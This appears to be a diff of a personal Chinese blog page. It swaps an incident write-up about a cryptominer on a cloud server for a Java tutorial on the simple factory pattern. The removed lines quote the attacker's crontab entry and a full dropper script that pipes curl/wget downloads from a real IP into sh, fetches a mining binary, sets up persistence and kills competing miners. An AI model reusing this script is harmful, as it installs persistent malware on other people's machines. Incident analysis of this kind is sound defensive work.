@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://landuo.github.io">
-  <title>记录一次被植入挖矿脚本并解决的过程 | Accidia的记事本</title>
+  <title>简单工厂模式 | Accidia的记事本</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前几天同事的阿里云CPU达到98%甚至100%的使用率, 然后向我寻求帮助, 经过一系列操作之后发现被植入挖矿脚本了(目测是服务器root密码设置简单被撞库了), 特地写下这篇文章记录下解决的过程. (由于解决的时候没有截图+该脚本的服务器被封禁了, 姑只能大致回忆下当时情形) 叨叨: 当我接手到他的电脑的时候觉得很神奇, 因为之前自己也有过被植入脚本挖矿导致 CPU 100%d的情况, 但我用的">
+  <meta name="description" content="介绍严格来说，「简单工厂模式」并不是 23 种常用的设计模式之一，它违背了设计模式六大原则之一的 开闭原则 (虽然可以通过反射的机制来避免)，因为每当需要添加一个功能时都需要在 if-else 或者 switch-case 语句中修改代码，添加分支条件 实现创建一个 Shape 接口和实现 Shape 接口的实体类，定义工厂类 ShapeFactory ，在 ShapeFactory 中定义获取">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记录一次被植入挖矿脚本并解决的过程">
-<meta property="og:url" content="http://landuo.github.io/resolv-cpu100-by-mine-script/index.html">
+<meta property="og:title" content="简单工厂模式">
+<meta property="og:url" content="http://landuo.github.io/simple_factory/index.html">
 <meta property="og:site_name" content="Accidia的记事本">
-<meta property="og:description" content="前几天同事的阿里云CPU达到98%甚至100%的使用率, 然后向我寻求帮助, 经过一系列操作之后发现被植入挖矿脚本了(目测是服务器root密码设置简单被撞库了), 特地写下这篇文章记录下解决的过程. (由于解决的时候没有截图+该脚本的服务器被封禁了, 姑只能大致回忆下当时情形) 叨叨: 当我接手到他的电脑的时候觉得很神奇, 因为之前自己也有过被植入脚本挖矿导致 CPU 100%d的情况, 但我用的">
+<meta property="og:description" content="介绍严格来说，「简单工厂模式」并不是 23 种常用的设计模式之一，它违背了设计模式六大原则之一的 开闭原则 (虽然可以通过反射的机制来避免)，因为每当需要添加一个功能时都需要在 if-else 或者 switch-case 语句中修改代码，添加分支条件 实现创建一个 Shape 接口和实现 Shape 接口的实体类，定义工厂类 ShapeFactory ，在 ShapeFactory 中定义获取">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2019-10-30T05:51:16.000Z">
-<meta property="article:modified_time" content="2020-08-17T15:27:56.947Z">
+<meta property="article:published_time" content="2020-08-18T12:40:43.000Z">
+<meta property="article:modified_time" content="2020-08-23T14:56:32.570Z">
 <meta property="article:author" content="Accidia">
-<meta property="article:tag" content="linux">
+<meta property="article:tag" content="设计模式">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Accidia的记事本" type="application/atom+xml">
@@ -158,61 +158,50 @@ ga('send', 'pageview');
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-resolv-cpu100-by-mine-script" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-design-pattern/simple_factory" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      记录一次被植入挖矿脚本并解决的过程
+      简单工厂模式
     </h1>
   
 
         
-        <a href="/resolv-cpu100-by-mine-script/" class="archive-article-date">
-  	<time datetime="2019-10-30T05:51:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-30</time>
+        <a href="/simple_factory/" class="archive-article-date">
+  	<time datetime="2020-08-18T12:40:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-18</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>前几天同事的阿里云CPU达到98%甚至100%的使用率, 然后向我寻求帮助, 经过一系列操作之后发现被植入挖矿脚本了(目测是服务器root密码设置简单被撞库了), 特地写下这篇文章记录下解决的过程. (由于解决的时候没有截图+该脚本的服务器被封禁了, 姑只能大致回忆下当时情形)</p>
-<p>叨叨: 当我接手到他的电脑的时候觉得很神奇, 因为之前自己也有过被植入脚本挖矿导致 CPU 100%d的情况, 但我用的VPS此时都已经是连不上的状态了, 但他的阿里云还能正常的连上ssh, 不知道是CPU没到100% 的缘故还是阿里做的优化的问题.  下面说下当初处理的步骤:  </p>
+        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>严格来说，「简单工厂模式」并不是 23 种常用的设计模式之一，它违背了设计模式六大原则之一的 <strong>开闭原则</strong> (虽然可以通过反射的机制来避免)，因为每当需要添加一个功能时都需要在 <em>if-else</em> 或者 <em>switch-case</em> 语句中修改代码，添加分支条件</p>
+<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>创建一个 <em>Shape</em> 接口和实现 <em>Shape</em> 接口的实体类，定义工厂类 <em>ShapeFactory</em> ，在 <em>ShapeFactory</em> 中定义获取 <em>Shape</em> 对象的方法，需要向此方法传递信息以便创建所需对象的类型</p>
+<p><strong>步骤1:</strong> 创建一个接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <a id="more"></a>
+<p><strong>步骤2:</strong> 创建接口的实现类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> <span class="keyword">implements</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"Inside Rectangle::draw() method."</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Square</span> <span class="keyword">implements</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"Inside Square::draw() method."</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Circle</span> <span class="keyword">implements</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"Inside Circle::draw() method."</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li><p>使用 <code>top</code> 查看了下系统当前资源的利用率, 发现CPU在 98-99之间徘徊, CPU占用率最高的一个进程 <strong>COMMAND</strong> 叫做 <strong>Donald</strong>, 立马用 <code>find</code> 和 <code>whereis</code> 搜了一下, 结果没找到. 然后寻思着杀死这个进程, 后来同事说好像过段时间就会重新启动, 立马想到 linux 的定时任务 <strong>crontab</strong>.  </p>
-</li>
-<li><p>因为当时登录的是 <strong>root</strong> 用户, 所以用 <code>crontab -l</code> 查看了定时任务, 果真有这定时任务, 大喜 ! 执行命令得出的结果好像是这样的 :  </p>
-</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -fsSL -m180  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh</span><br></pre></td></tr></table></figure>
+<p><strong>步骤3:</strong> 创建一个工厂，生成基于给定信息的实体类的对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShapeFactory</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">   <span class="comment">// 获取形状类型的对象</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> Shape <span class="title">getShape</span><span class="params">(String shapeType)</span></span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(shapeType == <span class="keyword">null</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;        </span><br><span class="line">      <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">"CIRCLE"</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> Circle();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">"RECTANGLE"</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> Rectangle();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">"SQUARE"</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> Square();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p><strong>步骤4:</strong> 使用工厂创建不同的对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FactoryPatternDemo</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    ShapeFactory shapeFactory = <span class="keyword">new</span> ShapeFactory();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取 Circle 的对象，并调用它的 draw 方法</span></span><br><span class="line">      Shape shape1 = shapeFactory.getShape(<span class="string">"CIRCLE"</span>);</span><br><span class="line">      <span class="comment">//调用 Circle 的 draw 方法</span></span><br><span class="line">      shape1.draw();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取 Rectangle 的对象，并调用它的 draw 方法</span></span><br><span class="line">      Shape shape2 = shapeFactory.getShape(<span class="string">"RECTANGLE"</span>);</span><br><span class="line">      <span class="comment">//调用 Rectangle 的 draw 方法</span></span><br><span class="line">      shape2.draw();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取 Square 的对象，并调用它的 draw 方法</span></span><br><span class="line">      Shape shape3 = shapeFactory.getShape(<span class="string">"SQUARE"</span>);</span><br><span class="line">      <span class="comment">//调用 Square 的 draw 方法</span></span><br><span class="line">      shape3.draw();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>接着顺腾摸瓜, 从定时任务里拿curl 那个命令去下载 i.sh 这个文件, 得到下面的内容的文件:  </li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin</span><br><span class="line"></span><br><span class="line">mkdir -p /var/spool/cron/crontabs</span><br><span class="line">echo "" &gt; /var/spool/cron/root</span><br><span class="line">echo "*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -fsSL -m180  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh" &gt;&gt; /var/spool/cron/root</span><br><span class="line">cp -f /var/spool/cron/root /var/spool/cron/crontabs/root</span><br><span class="line"></span><br><span class="line">cd /tmp</span><br><span class="line">touch /usr/local/bin/writeable &amp;&amp; cd /usr/local/bin/</span><br><span class="line">touch /usr/libexec/writeable &amp;&amp; cd /usr/libexec/</span><br><span class="line">touch /usr/bin/writeable &amp;&amp; cd /usr/bin/</span><br><span class="line">rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable</span><br><span class="line"></span><br><span class="line">export PATH=$PATH:$(pwd)</span><br><span class="line">ps auxf | grep -v grep | grep sequfa4 || rm -rf sequfa4</span><br><span class="line">if [ ! -f "sequfa4" ]; then</span><br><span class="line">    curl -fsSL -m1800 http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -o sequfa4||wget -q -T1800  http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -O sequfa4</span><br><span class="line">fi</span><br><span class="line">chmod +x sequfa4</span><br><span class="line">/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4</span><br><span class="line"></span><br><span class="line">ps auxf | grep -v grep | grep sequbcb | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequbcc | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequbcd | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequbce | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa0 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa1 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa2 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line">ps auxf | grep -v grep | grep sequfa3 | awk '&#123;print $2&#125;' | xargs kill -9</span><br><span class="line"></span><br><span class="line">echo "*/15 * * * * (/usr/bin/sequfa4||/usr/libexec/sequfa4||/usr/local/bin/sequfa4||/tmp/sequfa4||curl -m180 -fsSL  http://103.219.112.66:8000/i.sh||wget -q -T180 -O- http://103.219.112.66:8000/i.sh) | sh" | crontab -</span><br></pre></td></tr></table></figure>
+<p><strong>输出结果:</strong></p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Inside Circle::draw() <span class="function"><span class="keyword">method</span>.</span></span><br><span class="line"><span class="function"><span class="title">Inside</span> <span class="title">Rectangle</span>:</span>:draw() <span class="function"><span class="keyword">method</span>.</span></span><br><span class="line"><span class="function"><span class="title">Inside</span> <span class="title">Square</span>:</span>:draw() <span class="function"><span class="keyword">method</span>.</span></span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>分析这个文件可以知道, 该脚本在机子上运行了一个叫做 <strong>sequfa4</strong>, 拿到百度一搜这个名字, 嗯 ? 没啥结果 ? 接着仔细看完才晓得, 其实是在这一串代码中下载了一个本机架构的 <strong>ddgs</strong> 的文件 !  </li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if [ ! -f "sequfa4" ]; then</span><br><span class="line">    curl -fsSL -m1800 http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -o sequfa4||wget -q -T1800  http://103.219.112.66:8000/static/4004/ddgs.$(uname -m) -O sequfa4</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>搜索引擎一搜, 哦豁, 果真是挖矿脚本, 不过好在脚本所做的时候都已经知道了, 只要把此脚本做的事逆向回去就好了. </li>
-</ul>
-<pre><code class="shell">  #清除定时任务  
-  echo &quot;&quot; &gt; /var/spool/cron/root 
-  echo &quot;&quot; &gt; /var/spool/cron/crontabs/root
-
-  # 使用 rm 命令删除掉下载的 sequfa4 文件  
-  rm /usr/bin/sequfa4 /usr/libexec/sequfa4 /usr/local/bin/sequfa4 /tmp/sequfa4</code></pre>
-<ul>
-<li>接下来做的就是清除定时器里的任务和删掉下载的文件就好了, 但我发现删了并没有用, 然后试着重启之后就完全没有问题了. 用了早上大概一小时的时间发现问题并解决问题, 虽然实际解决很简单, 但发现的过程实在是很快乐. 吃一堑长一智, 估计下次他的密码应该会复杂一点点了.</li>
-</ul>
+<p>可以想象到，如果系统中再需要添加一个实现 <em>Shape</em> 接口的实体类时，就需要修改 <em>ShapeFactory</em> 类，在 <em>getShape(String shapeType)</em> 这个方法里的 <em>if-else</em> 再添加一个分支条件，这就违反了 <strong>开闭原则</strong></p>
+<h3 id="使用反射改善简单工厂"><a href="#使用反射改善简单工厂" class="headerlink" title="使用反射改善简单工厂"></a>使用反射改善简单工厂</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShapeFactory</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">getShape</span><span class="params">(Class&lt;? extends Shape&gt; clazz)</span> </span>&#123;</span><br><span class="line">        Object instance = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            instance = Class.forName(clazz.getName()).newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException | IllegalAccessException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>测试方法：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> factory.simple;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FactoryPatternDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ShapeFactory shapeFactory = <span class="keyword">new</span> ShapeFactory();</span><br><span class="line"></span><br><span class="line">        Rectangle rectangle = (Rectangle) shapeFactory.getShape(Rectangle.class);</span><br><span class="line">        rectangle.draw();</span><br><span class="line"></span><br><span class="line">        Circle circle = (Circle) shapeFactory.getShape(Circle.class);</span><br><span class="line">        circle.draw();</span><br><span class="line"></span><br><span class="line">        Square square = (Square) shapeFactory.getShape(Square.class);</span><br><span class="line">        square.draw();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>输出结果：</strong></p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Inside Circle::draw() <span class="function"><span class="keyword">method</span>.</span></span><br><span class="line"><span class="function"><span class="title">Inside</span> <span class="title">Rectangle</span>:</span>:draw() <span class="function"><span class="keyword">method</span>.</span></span><br><span class="line"><span class="function"><span class="title">Inside</span> <span class="title">Square</span>:</span>:draw() <span class="function"><span class="keyword">method</span>.</span></span><br></pre></td></tr></table></figure>
+<p>经过测试后发现，改善后的代码与之前使用 <em>if-else</em> 的代码两者效果一致，但每次需要添加新功能时就不需要修改 <em>ShapeFactory</em> 里的 <em>getShape</em> 方法了</p>
 
       
 
@@ -226,7 +215,7 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">设计模式</a>
         		</li>
       		
 		</ul>
@@ -238,7 +227,7 @@ ga('send', 'pageview');
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/Notes//" class="article-tag-list-link color1">Notes</a>
+        			<a href="/categories/Study//" class="article-tag-list-link color1">Study</a>
         		</li>
       		
 		</ul>
@@ -293,7 +282,7 @@ ga('send', 'pageview');
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://landuo.github.io/resolv-cpu100-by-mine-script/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://landuo.github.io/simple_factory/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -307,18 +296,18 @@ ga('send', 'pageview');
   
 <nav id="article-nav">
   
-    <a href="/design-pattern/design-pattern-intro/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/factory_method/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          设计模式介绍
+          工厂方法模式
         
       </div>
     </a>
   
   
-    <a href="/install_docker_with_raspberry_pi/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">树莓派安装docker</div>
+    <a href="/singleton/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">单例模式</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -357,7 +346,7 @@ ga('send', 'pageview');
 <script src="//imsun.github.io/gitment/dist/gitment.browser.js"></script>
 <script>
 var gitment = new Gitment({
-  id: "http://landuo.github.io/resolv-cpu100-by-mine-script/",
+  id: "http://landuo.github.io/simple_factory/",
   owner: 'landuo',
   repo: 'landuo.github.io',
   oauth: {
@@ -478,15 +467,15 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">树莓派</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">docker</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
               </li>
              
               <li class="article-tag-list-item">
